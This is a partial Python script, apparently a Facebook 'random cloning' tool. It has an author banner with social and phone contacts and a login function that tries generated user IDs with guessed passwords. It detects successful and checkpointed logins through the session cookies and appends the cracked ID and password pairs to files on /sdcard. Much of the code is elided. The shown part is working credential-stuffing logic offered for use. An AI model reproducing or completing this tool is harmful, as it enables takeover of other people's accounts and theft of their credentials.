...
import zlib
import base64
os.system('espeak -a 300 "WELCOME TO ENAAMULLAH BADER RANDOM CLONING TOOLS"')
...
########  ##     ## ########  ######## ##     ## 
\033[1;90m══════════════════════════════════════════════════════════════════════
\033[1;92m[+] AUTHOR    :  Enaamullah Bader
\033[1;92m[+] GITHUB    :  Bader_007
\033[1;92m[+] FACEBOOK  :  Enaamullah Bader
\033[1;92m[+] WHATSAPP  :  +93781480808
\033[1;92m[+] TELEGRAM :  +93781480808
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mBader-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/Bader-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mBader-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/Bader-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
